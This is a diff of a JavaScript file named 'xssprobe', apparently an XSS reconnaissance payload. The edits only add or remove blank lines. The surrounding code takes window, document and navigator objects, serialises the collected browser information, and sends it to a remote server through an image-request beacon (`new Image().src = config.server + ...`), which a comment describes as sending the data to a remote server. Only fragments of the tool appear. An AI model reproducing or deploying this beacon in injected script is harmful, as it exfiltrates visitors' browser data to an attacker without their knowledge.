@@ -1,6 +1,7 @@
 ﻿/*
 xssprobe
 by evilcos@gmail.com | @xeyeteam
+
 */
 
 (function(w,d,n) {
@@ -82,7 +83,6 @@ by evilcos@gmail.com | @xeyeteam
 		);
 		return '{' + arr.join(',') + '}';
 	}
-
 	// GET方法发送信息到远程服务器
 	new Image().src = config.server + encode(info);
 })(window, document, navigator);
